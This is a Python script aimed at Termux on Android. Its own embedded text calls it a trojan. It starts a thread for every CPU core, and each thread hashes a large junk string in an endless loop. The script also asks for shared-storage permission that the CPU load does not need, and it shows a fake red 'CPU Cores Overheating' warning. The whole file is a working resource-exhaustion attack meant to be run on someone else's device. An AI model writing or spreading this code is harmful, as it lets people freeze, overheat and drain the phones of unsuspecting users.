import os
import sys
import time
import hashlib
import threading

JUMLAH_THREAD=os.cpu_count() or 4
DATA_MENTAH="(_(_+_($#))#)_)_)#)#($+)_(_-_)$+#)$+)_+)#+)#+_)_+$)#+(#+_(_+$)+#)#72937_9$+#92+_)8_)#+#)#+_98_/_(#)+#)#+_)_+$)+2)#728=€{=¥=¥{€[¢[=€®✓¢]¢✓]€×¥=[¢=¢]¥[©{¢€[¥}®}€∆`×`§`÷§•÷•×`π~π~°€{¥✓[©©÷✓¢[¢™€[™]©[©][%>>>>>>©[©✓©[%[¢[€=[©=¢[|=€=KONXJXNDJDJDEKEUDNDIAJWOEJDODJAMKWNNDXKWLEKJDNKFIEOWWJDO82W8282828282882°€=¥=¥¢{=}=¢}¢{€}¥]¢[€©[]©=€€{¥^((#+$+$89$929292929292090010101010(*!;*(#+#!_+!_82828(388(3($8$7#(#+$!$!$!!$${€{€=€¥✓©]©[%]¢[><><><><><><>{€=€{¢=¢{~{`==€×¥×`×~×~×~××~×`÷|{|¥{€={¢=€{€[¥=€{€{{€}¥{€}€}€}}€}€}€}€{{€{|{|{¥[¥=¥=€✓|=¢✓©=©✓€=✓|=€=©✓€=✓€÷€=÷`×`×`×`×`×`×`×`×`×`{~{~~{€\€}§€×€}£×`×8828+2(_+_)$+3!2!82)////§}¢}¢×€{€{€>>|TROJAN INVENCTION YOUR DEVICE! ENJOY THE CPU PANIC " * 10240

def konsumsi_cpu():
    while True:
        try:
            hashlib.sha512(DATA_MENTAH.encode('utf-8')).hexdigest()
        except Exception:
            pass

def main():
    if not os.path.exists(os.path.join(os.path.expanduser('~'), 'storage', 'shared')):
        os.system('termux-setup-storage')
        time.sleep(5) 
    
    threads=[]
    for i in range(JUMLAH_THREAD):
        t=threading.Thread(target=konsumsi_cpu)
        t.daemon=True
        threads.append(t)

    for t in threads:
        t.start()

    try:
        os.system('clear')
        while True:
            sys.stdout.write("\033[91m")
            print(f"System Monitor: CPU Cores Overheating! (Threads: {JUMLAH_THREAD})")
            sys.stdout.write("\033[0m")
            time.sleep(1)
            
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
